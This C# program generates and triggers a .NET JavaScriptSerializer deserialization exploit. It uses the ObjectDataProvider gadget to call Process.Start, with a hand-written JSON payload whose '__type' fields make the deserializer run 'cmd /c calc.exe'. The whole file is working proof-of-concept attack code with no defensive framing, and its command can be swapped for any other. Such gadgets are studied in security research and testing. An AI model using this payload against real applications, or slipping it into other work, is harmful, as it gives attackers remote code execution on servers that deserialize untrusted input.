using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Diagnostics;
using System.Windows.Data;
using System.Collections.Specialized;
using System.Reflection;

namespace JavaScriptSerializer_ObjectDataProvider
{
    class Program
    {
        static void SerPayload()
        {
            var pStartInf = new ProcessStartInfo();
            pStartInf.FileName = "cmd";
            pStartInf.Arguments = "/c calc.exe";
            StringDictionary dict = new StringDictionary();
            Type t = pStartInf.GetType();
            FieldInfo field = t.GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic);
            field.SetValue(pStartInf, dict);


            var proc = new Process();
            proc.StartInfo = pStartInf;

            var obj = new ObjectDataProvider();
            obj.MethodName = "Start";
            obj.IsInitialLoadEnabled = false;
            obj.ObjectInstance = proc;

            var s = new SimpleTypeResolver();
            JavaScriptSerializer jss = new JavaScriptSerializer(s);
            string payload = jss.Serialize(pStartInf);
            Console.WriteLine(payload);
        }

        static void DeserPayloadTest()
        {
            string payload =
@"{
    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'ObjectInstance':{
                '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        'StartInfo': {
                    '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
            'FileName':'cmd',
            'Arguments':'/c calc.exe'
        }
            }
}";
            JavaScriptSerializer jss = new JavaScriptSerializer(new SimpleTypeResolver());
            var obj = jss.Deserialize<Object>(payload);

        }


        static void Main(string[] args)
        {
            SerPayload();
            DeserPayloadTest();
        }
    }
}
